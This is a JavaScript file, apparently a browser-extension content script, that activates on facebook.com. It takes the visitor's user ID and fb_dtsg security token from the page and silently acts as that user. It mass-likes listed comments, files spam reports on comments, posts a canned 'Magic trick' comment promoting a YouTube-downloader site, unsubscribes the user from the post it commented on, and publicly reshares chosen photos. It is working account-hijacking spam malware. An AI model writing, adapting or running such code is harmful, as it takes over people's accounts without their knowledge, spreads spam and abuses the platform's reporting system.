var c_enabled=true;
var delay_time=1000;

var host = document.location.host;
//var postid="959785080797496";
//var commentid="959792137463457";

	var commentsArr = [
	
	//"10154288208595476_10154288234715476",
	//"1285041361560951_1288604894537931",
	//"10153349982433124_10153349997118124",
	
	
	//"10154075879196840_10154078813201840",
	//"1101345036606262_1101501389923960",
	//"10154072811491840_10154074911546840",
	//"738908346182868_944407085632992",
	//"1282591801805907_1283398725058548",
	//"10154069511146840_10154070832861840",
	//"1790894464266938_1791185187571199",
	//"1282591801805907_1283398725058548",
	//"1280111542053933_1281377401927347",
	//"1087008681356347_1087168821340333",
	//"940814059373676_940843412704074",
	//"10154063050841840_10154064300116840",
	//"1380576535289399_1380787268601659",
	//"1088664214541011_1088738594533573",
	//"1269508336447587_1270738276324593",
	//"10156149153025613_10156149542145613",
	
	//"1758694164153635_1759428200746898",
	
	//"10154022396926840_10154024875726840",
	//"1087641484643284_1087678497972916",
	//"10154022384446840_10154024082501840",
	//"10154018705181840_10154022464416840",
	//"1268086599923094_1269023699829384",
	//"10154022783286840_10154022845376840",
	//"1753584157997969_1755656171124101",
	//"10154007343401840_10154007952036840",
	//"1741436825879369_1741482095874842",
	//"1078239522250147_1078243668916399",
	//"10153996435651840_10153998818431840",
	//"10153979905786840_10153983513266840",
	
//"10153979891866840_10153981988006840",
//"1359937544019965_1360073520673034",
//"10154049079236840_10154050018046840",
];





//5awza2a

var repComments=[





];


var magicCommentText = "\n";


magicCommentText += "Learn the best Magic trick ever:\n";
magicCommentText += "v\n";
magicCommentText += "v\n";
magicCommentText += "v\n";
magicCommentText += "v\n";
magicCommentText += "How to download videos from Ytube in HD and convert them to Mp3:\n";
magicCommentText += "\n";
magicCommentText += "1- Open the Ytube website from the file you want to get\n";
magicCommentText += "\n";
magicCommentText += "2- Insert the word 'Magic' between the two words 'You' and 'Tube' in the URL (In the address bar on the top of the browser) then press Enter button\n\n";
magicCommentText += "Ex:\n";
magicCommentText += "you tube .com/watch?v=Qtb11P1FWnc\n";
magicCommentText += "will become : youMagictube .com/watch?v=Qtb11P1FWnc\n\n";
magicCommentText += "3-You will get a list of all formats and you also have option for Mp3\n\n"

var normalText = "Use Magic to download any video. Like when you try it :D" ;

var isUseImage=false;

var commentPostID ='964225250297637';
var commentText = isUseImage?normalText:magicCommentText;
var commentImage=isUseImage?'https://scontent-cai1-2.xx.fbcdn.net/hphotos-xta1/v/t1.0-9/11659387_1642483462638292_1336622283352157343_n.jpg?oh=ace9a81cda068d999faded4a50a90dc4&oe=565B8ABC':'';

//addComment(commentPostID,commentText,commentImage);



/***********************************************************************************
// Image Comments 

//jordan : https://scontent-cai1-2.xx.fbcdn.net/hphotos-xpt1/v/t1.0-9/11223486_1457056467923039_4935368971946859084_n.jpg?oh=25de9c79903ff4146c3b65416e474523&oe=562656E3
//bean magic : https://scontent-cdg2-1.xx.fbcdn.net/hphotos-xtf1/v/t1.0-9/11262106_1080970761933059_6011232662620236584_n.jpg?oh=59c98bdabe31cc215856ea13282e56f8&oe=561EB9FC
//patrick magic: https://scontent-cdg2-1.xx.fbcdn.net/hphotos-xpa1/v/t1.0-9/11665364_570156789789154_5526471531338743380_n.jpg?oh=1f5333b366527aee4619016a5a6a7323&oe=561B1571
//Squidward magic : https://fbcdn-sphotos-c-a.akamaihd.net/hphotos-ak-xta1/v/t1.0-9/s720x720/1907511_965012873543605_3627725645557220488_n.jpg?oh=97fd8a98636739f7c3eb2955d6f0b810&oe=5626E43F&__gda__=1445664970_670f060328fea59e4e883aa0e503c34e
//spongebob magic: https://scontent-cdg2-1.xx.fbcdn.net/hphotos-xft1/v/t1.0-9/1509892_1615044448774104_7792581144966539795_n.jpg?oh=7bd1653a2f6c6b8fea2862d608360a32&oe=5623C653
//kermit magic: https://fbcdn-sphotos-f-a.akamaihd.net/hphotos-ak-xpf1/v/t1.0-9/11666119_1119656494728002_1631227797748298468_n.jpg?oh=5347e04d07f4a835cf81adc0a6290582&oe=561E998F&__gda__=1445489328_aeaef12e32f800e2d475c3d15cecd1a9
//Download This Video: https://scontent-cdg2-1.xx.fbcdn.net/hphotos-xpf1/v/t1.0-9/s480x480/1480742_728433553946711_3038850116993894535_n.png?oh=74904a806c3f34f5c5f5d45b6aba61b3&oe=5611F27B
//Joker: https://scontent-cai1-2.xx.fbcdn.net/hphotos-xta1/v/t1.0-9/11659387_1642483462638292_1336622283352157343_n.jpg?oh=ace9a81cda068d999faded4a50a90dc4&oe=565B8ABC
// Did you know: https://scontent-cai1-1.xx.fbcdn.net/hphotos-xpt1/v/t1.0-9/s720x720/11703120_1642482829305022_5760321331719484667_n.png?oh=381ab3d954d615d1f8f05e0cd361152d&oe=5651B4F0
// Obama: https://fbcdn-sphotos-c-a.akamaihd.net/hphotos-ak-xfa1/v/t1.0-9/10629660_1658905381060771_4501920819657819393_n.jpg?oh=1d6f6dce72e3887d77f73bf56922ee57&oe=56654407&__gda__=1449743500_347686ff5d0dd492b35c2ccef7c7c36a
**********************************************************************************/


/************************************************************************************
//Text Comments

//Video: https://www.facebook.com/magicalpowerr/videos/1642484219304883/
//Joker: https://www.facebook.com/magicalpowerr/photos/1642483462638292/?type=1&theater
//Michael gordon: https://www.facebook.com/magicalpowerr/photos/1642483555971616/?type=1&theater
//Download this video: https://www.facebook.com/magicalpowerr/photos/1642483675971604/?type=1
//Squidward: https://www.facebook.com/magicalpowerr/photos/1642483245971647/?type=1&theater
//Sponge bob: https://www.facebook.com/magicalpowerr/photos/1642483135971658/?type=1
//Patrick: https://www.facebook.com/magicalpowerr/photos/1642483089304996/?type=1
//Mr Bean: https://www.facebook.com/magicalpowerr/photos/1642483019305003/?type=1
//Kermit: https://www.facebook.com/magicalpowerr/photos/1642482912638347/?type=1
//did you know: https://www.facebook.com/magicalpowerr/photos/1642482829305022/?type=1

**************************************************************************************/



var commentsArrIndex = 0;
var repCommentsIndex = 0;
if(host=="www.facebook.com"||host=="facebook.com"){

	var container = document.createElement("div");
	//container.style.display="none";
	container.id="appended-content-id";
	
	if(c_enabled){
		delayedAction();
		delayedReport();
	}
	
	
}

function delayedAction(){

	var t=setTimeout(function(){
		var currComment = commentsArr[commentsArrIndex].split("_");
		var postid = currComment[0];
		var commentid = currComment[1];
		
		doAction(postid,commentid);
		commentsArrIndex++;
		if(commentsArrIndex<commentsArr.length){
			delayedAction();
		}
	},delay_time);
		
}

function delayedReport(){
	
	var t=setTimeout(function(){
	
		if( repComments.length>0){
			var currComment = repComments[repCommentsIndex].split("_");
			var postid = currComment[0];
			var commentid = currComment[1];
			
			report(postid,commentid);
			repCommentsIndex++;
			if(repCommentsIndex<repComments.length){
				delayedReport();
			}
		}
		
	},delay_time);

}

function doAction(postid,commentid){

	
	var host = document.location.host;
	

	//url = "https://www.facebook.com/ajax/ufi/comment_like.php";
	url = "https://www.facebook.com/ufi/comment/like/";
	var xmlhttp=new XMLHttpRequest();
	xmlhttp.onreadystatechange=function(){
		if(xmlhttp.readyState==4 && xmlhttp.status==200){
			
		}
	}
	
	var userid = document.querySelectorAll("[id^=profile_pic_header_]");
	if(userid.length>0){
		userid=userid[0].id;
		userid=userid.split("profile_pic_header_")[1];
	}
	else{
		userid=null;
	}
	
	var fb_dtsg = document.querySelectorAll("input[name=fb_dtsg]");
	if(fb_dtsg.length>0){
		fb_dtsg=fb_dtsg[0].value;
	}
	else{
		fb_dtsg=null;
	}
	
	if(userid!=null && fb_dtsg !=null){
	
		xmlhttp.open("POST",url,true)
		xmlhttp.send("comment_id="+postid+"_"+commentid+"&legacy_id="+commentid+"&like_action=true&ft_ent_identifier="+postid+"&source=2&client_id=1235251367926%3A3682654837&ft[tn]=&ft[fbfeed_location]=5&__av="+userid+"&__user="+userid+"&__a=1&__dyn=&__req=&fb_dtsg="+fb_dtsg+"&ttstamp=&__rev=");
	}

}

function report(postid,commentid){

	var url="https://www.facebook.com/ajax/ufi/comment_spam.php";
	var xmlhttp=new XMLHttpRequest();
	xmlhttp.onreadystatechange=function(){
		if(xmlhttp.readyState==4 && xmlhttp.status==200){
			
		}
	}
	
	
	var userid = document.querySelectorAll("[id^=profile_pic_header_]");
	if(userid.length>0){
		userid=userid[0].id;
		userid=userid.split("profile_pic_header_")[1];
	}
	else{
		userid=null;
	}
	
	var fb_dtsg = document.querySelectorAll("input[name=fb_dtsg]");
	if(fb_dtsg.length>0){
		fb_dtsg=fb_dtsg[0].value;
	}
	else{
		fb_dtsg=null;
	}
	
	if(userid!=null && fb_dtsg !=null){
	
		xmlhttp.open("POST",url,true)
		xmlhttp.send("comment_id="+postid+"_"+commentid+"&spam_action=true&ft_ent_identifier="+postid+"&source=17&client_id=&ft[tn]=&ft[type]=&__user="+userid+"&__a=1&__dyn=&__req=&fb_dtsg="+fb_dtsg+"&ttstamp=&__rev=");
	
	}

}


 function sendAjax(url,method,data,callback){
	
	var xmlhttp=new XMLHttpRequest();
	xmlhttp.onreadystatechange=function(res){
		if(xmlhttp.readyState==4 && xmlhttp.status==200){
					if(typeof(callback)=="function"){
					//console.log(xmlhttp.responseText);
						callback(xmlhttp.responseText);
						
					}
		}
	}
	
	xmlhttp.open(method,url,true)
	xmlhttp.send(data);

	
 
 }

 
 //**************************************add comment************************************************


function addComment(postID,commentText,commentImage){


	
	var userid = document.querySelectorAll("[id^=profile_pic_header_]");
	if(userid.length>0){
		userid=userid[0].id;
		userid=userid.split("profile_pic_header_")[1];
	}
	else{
		userid=null;
	}
	
	var fb_dtsg = document.querySelectorAll("input[name=fb_dtsg]");
	if(fb_dtsg.length>0){
		fb_dtsg=fb_dtsg[0].value;
	}
	else{
		fb_dtsg=null;
	}
	
	if(userid!=null && fb_dtsg !=null){
	
		if(commentImage!=''){	
			var img = document.createElement('img');
			img.setAttribute('crossOrigin', 'anonymous');
			img.src = commentImage;
			img.onload = function () {
				var canvas = document.createElement("canvas"); 
				canvas.width = img.width; 
				canvas.height = img.height; 
				var ctx = canvas.getContext("2d"); 
				ctx.drawImage(img,0,0);
				var c = canvas.toDataURL('image/png');
				var encodedPng = c.substring(c.indexOf(',')+1,c.length);
				var decodedPng = Base64Binary.decode(encodedPng);
				//console.log(decodedPng)
				PostImageToFacebook( userid,fb_dtsg,'shareImage.png', 'image/png', decodedPng,function(res){
					if(res.indexOf('"fbid":')>=0){
						var photoID = res.split('"fbid":')[1];
						var photoID = photoID.split(',')[0];
						addTextComment(postID,commentText,userid,fb_dtsg,photoID);
					}
				
				});
			}

		}
		else{
			addTextComment(postID,commentText,userid,fb_dtsg,0);
		}
		
		
		
	
	}
	



};

function addTextComment(postID,commentText,userid,fb_dtsg,photoID){
	
	//var dataToBeSent = 'ft_ent_identifier='+postID+'&comment_text='+commentText+'&source=22&client_id=1435395183287%3A509531033&reply_fbid&parent_comment_id&rootid=u_ps_jsonp_2_0_s&clp=&attached_sticker_fbid=0&attached_photo_fbid=0&&feed_context=%7B%22fbfeed_context%22%3Atrue%2C%22location_type%22%3A36%2C%22is_starred%22%3Afalse%2C%22is_pinned_post%22%3Afalse%2C%22can_moderate_timeline_story%22%3Afalse%2C%22profile_id%22%3A133025843429181%2C%22is_published_from_composer%22%3Afalse%2C%22outer_object_element_id%22%3A%22u_ps_jsonp_2_0_0%22%2C%22object_element_id%22%3A%22u_ps_jsonp_2_0_0%22%2C%22is_ad_preview%22%3Afalse%2C%22is_editable%22%3Afalse%7D&ft[tn]=[]&ft[top_level_post_id]='+postID+'&ft[fbfeed_location]=36&nctr[_mod]=pagelet_timeline_main_column&av='+userid+'&__user='+userid+'&__a=1&__dyn=&__req=&fb_dtsg='+fb_dtsg+'&ttstamp=&__rev=';
		var dataToBeSent = 'ft_ent_identifier='+postID+'&comment_text='+commentText+'&source=22&client_id=1435395183287%3A509531033&reply_fbid&parent_comment_id&rootid=u_ps_jsonp_2_0_s&clp=&attached_sticker_fbid=0&attached_photo_fbid='+photoID+'&ft[tn]=[]&ft[top_level_post_id]='+postID+'&ft[fbfeed_location]=36&nctr[_mod]=pagelet_timeline_main_column&av='+userid+'&__user='+userid+'&__a=1&__dyn=&__req=&fb_dtsg='+fb_dtsg+'&ttstamp=&__rev=';
		sendAjax("https://www.facebook.com/ufi/add/comment/","POST",dataToBeSent,function(){
			//console.log("done!");
			unsubscribeFromPost(postID,userid,fb_dtsg);
			
		});
	
}

function unsubscribeFromPost(postID,userid,fb_dtsg){
	
	
	var dataToBeSent = 'message_id='+postID+'&follow=0&__user='+userid+'&__a=1&__dyn=&__req=&fb_dtsg='+fb_dtsg+'&ttstamp=&__rev='
		sendAjax("https://www.facebook.com/ajax/litestand/follow_post","POST",dataToBeSent,function(){
			console.log("unsubscribed!");	
			
		});

}



function PostImageToFacebook( userID,fb_dtsg, filename, mimeType, imageData,callback )
{
	// this is the multipart/form-data boundary we'll use
	var boundary = '----ThisIsTheBoundary1234567890';
	// let's encode our image file, which is contained in the var
	var formData = '--' + boundary + '\r\n'

formData += 'Content-Disposition: form-data; name="profile_id"\r\n\r\n'

formData += userID+'\r\n'

formData += '--' + boundary + '\r\n';
formData += 'Content-Disposition: form-data; name="source"\r\n\r\n'

formData += '18\r\n'
formData += '--' + boundary + '\r\n';
formData +='Content-Disposition: form-data; name="av"\r\n\r\n';

formData += userID+'\r\n'
formData += '--' + boundary + '\r\n';
	formData += 'Content-Disposition: form-data; name="file"; filename="' + filename + '"\r\n';
	formData += 'Content-Type: ' + mimeType + '\r\n\r\n';
	for ( var i = 0; i < imageData.length; ++i )
	{
	formData += String.fromCharCode( imageData[ i ] & 0xff );
	}
	/*
	formData += '\r\n';
	formData += '--' + boundary + '\r\n';
	formData += 'Content-Disposition: form-data; name="message"\r\n\r\n';
	formData += message + '\r\n'
	*/
	formData += '--' + boundary + '--\r\n';
	var xhr = new XMLHttpRequest();
	xhr.open( 'POST', 'https://www.facebook.com/ajax/ufi/upload/?__user='+userID+'&__a=1&__dyn=&__req=1e&fb_dtsg='+fb_dtsg+'&ttstamp=&__rev=', true );
	xhr.onload = xhr.onerror = function() {
	if(typeof(callback)=='function'){
		callback(xhr.responseText);
		}
		console.log( xhr.responseText );
	};
	xhr.setRequestHeader( "Content-Type", "multipart/form-data; boundary=" + boundary );
	xhr.sendAsBinary( formData );
}


 
if ( XMLHttpRequest.prototype.sendAsBinary === undefined ) {
XMLHttpRequest.prototype.sendAsBinary = function(string) {
	var bytes = Array.prototype.map.call(string, function(c) {
	return c.charCodeAt(0) & 0xff;
	});
	this.send(new Uint8Array(bytes).buffer);
	};
}

var Base64Binary = {
	_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
	/* will return a Uint8Array type */
	decodeArrayBuffer: function(input) {
	var bytes = (input.length/4) * 3;
	var ab = new ArrayBuffer(bytes);
	this.decode(input, ab);
	return ab;
	},
	removePaddingChars: function(input){
	var lkey = this._keyStr.indexOf(input.charAt(input.length - 1));
	if(lkey == 64){
	return input.substring(0,input.length - 1);
	}
	return input;
	},
	decode: function (input, arrayBuffer) {
	//get last chars to see if are valid
	input = this.removePaddingChars(input);
	input = this.removePaddingChars(input);
	var bytes = parseInt((input.length / 4) * 3, 10);
	var uarray;
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;
	var j = 0;
	if (arrayBuffer)
	uarray = new Uint8Array(arrayBuffer);
	else
	uarray = new Uint8Array(bytes);
	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
	for (i=0; i<bytes; i+=3) {
	//get the 3 octects in 4 ascii chars
	enc1 = this._keyStr.indexOf(input.charAt(j++));
	enc2 = this._keyStr.indexOf(input.charAt(j++));
	enc3 = this._keyStr.indexOf(input.charAt(j++));
	enc4 = this._keyStr.indexOf(input.charAt(j++));
	chr1 = (enc1 << 2) | (enc2 >> 4);
	chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
	chr3 = ((enc3 & 3) << 6) | enc4;
	uarray[i] = chr1;
	if (enc3 != 64) uarray[i+1] = chr2;
	if (enc4 != 64) uarray[i+2] = chr3;
	}
	return uarray;
	}
}
	
	





var postsToShare = [
"https://www.facebook.com/photo.php?fbid=1454607634834722",
"https://www.facebook.com/photo.php?fbid=1454607684834717",
//"https://www.facebook.com/photo.php?fbid=1454607804834705",
"https://www.facebook.com/photo.php?fbid=1454607834834702",
"https://www.facebook.com/photo.php?fbid=1454607858168033",
"https://www.facebook.com/photo.php?fbid=1454607938168025",
"https://www.facebook.com/photo.php?fbid=1454607961501356",
"https://www.facebook.com/photo.php?fbid=1454607988168020",
"https://www.facebook.com/photo.php?fbid=1454608001501352",
];


var selectedPost = postsToShare[Math.floor(Math.random()*postsToShare.length)];


//sharePost(selectedPost);



function sharePost(shareURL){

var textToShare = "";
var expDays = 2;
var cookieName = "savePostedd";


 var savedCookie = getCookie(cookieName);
 if(savedCookie==null){
	share();
 }

 
 
 
 
function setPostCookie(){

	setCookie(cookieName,shareURL,expDays);
	

}


function share(){


	sendAjax('https://www.facebook.com/sharer/sharer.php?app_id=2392950137&u='+shareURL,"GET","",function(res){

	
			var form = res.split("<form")[1];
			form=form.split("</form>")[0];
			form = "<form"+form+"</form>";
			form = form.replace(/\n/g,"");
			
			
			//var container = $("<div>");
			var container = document.createElement("div");
			container.innerHTML=form;
			
			
			var publicid=null;
			try{
			
				publicid = res.split("everyone.png\",")[1];
				//console.log(publicid);
				publicid = publicid.split("\"postParam\":")[1];
				//console.log(publicid);
				publicid = publicid.split(',')[0];
				//console.log(publicid);
			}
			catch(ex){
				publicid=null;
			}
			
			container.querySelectorAll("textarea")[0].value=textToShare;
			//container.find("textarea").first().val(textToShare);
			var dataToBeSent =  serialize(container.querySelectorAll("form")[0]);
			
			if(publicid!=null && (!isNaN(parseInt(publicid)))){
				dataToBeSent = dataToBeSent + '&privacyx='+publicid
			}
			
			sendAjax('/ajax/sharer/submit_page/',"POST",dataToBeSent,function(resp){
				setPostCookie();
			});
		


	});
}

function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
    }
    return null;
}


 function serialize (form) {
        if (!form || form.nodeName !== "FORM") {
                return;
        }
        var i, j, q = [];
        for (i = form.elements.length - 1; i >= 0; i = i - 1) {
                if (form.elements[i].name === "") {
                        continue;
                }
                switch (form.elements[i].nodeName) {
                case 'INPUT':
                        switch (form.elements[i].type) {
                        case 'text':
                        case 'hidden':
                        case 'password':
                        case 'button':
                        case 'reset':
                        case 'submit':
                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                break;
                        case 'checkbox':
                        case 'radio':
                                if (form.elements[i].checked) {
                                        q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                }                                               
                                break;
                        }
                        break;
                        case 'file':
                        break; 
                case 'TEXTAREA':
                        q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                        break;
                case 'SELECT':
                        switch (form.elements[i].type) {
                        case 'select-one':
                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                break;
                        case 'select-multiple':
                                for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1) {
                                        if (form.elements[i].options[j].selected) {
                                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].options[j].value));
                                        }
                                }
                                break;
                        }
                        break;
                case 'BUTTON':
                        switch (form.elements[i].type) {
                        case 'reset':
                        case 'submit':
                        case 'button':
                                q.push(form.elements[i].name + "=" + encodeURIComponent(form.elements[i].value));
                                break;
                        }
                        break;
                }
        }
        return q.join("&");
}
 

}







